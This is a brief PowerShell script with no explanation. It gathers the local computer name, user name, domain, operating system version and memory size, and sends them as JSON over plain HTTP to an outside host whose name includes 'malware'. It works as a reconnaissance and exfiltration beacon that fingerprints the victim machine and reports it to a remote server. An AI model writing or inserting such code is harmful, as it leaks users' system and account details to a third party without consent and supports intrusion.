$Inventory = @{
    ComputerName = $env:COMPUTERNAME
    UserName     = $env:USERNAME
    Domain       = $env:USERDOMAIN
    OS           = (Get-CimInstance Win32_OperatingSystem).Caption
    Version      = (Get-CimInstance Win32_OperatingSystem).Version
    MemoryGB     = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    Timestamp    = (Get-Date).ToString("o")
}

$json = $Inventory | ConvertTo-Json -Depth 5

Invoke-RestMethod `
    -Uri "http://xbota-malwareablocal.com" `
    -Method POST `
    -Body $json `
    -ContentType "application/json"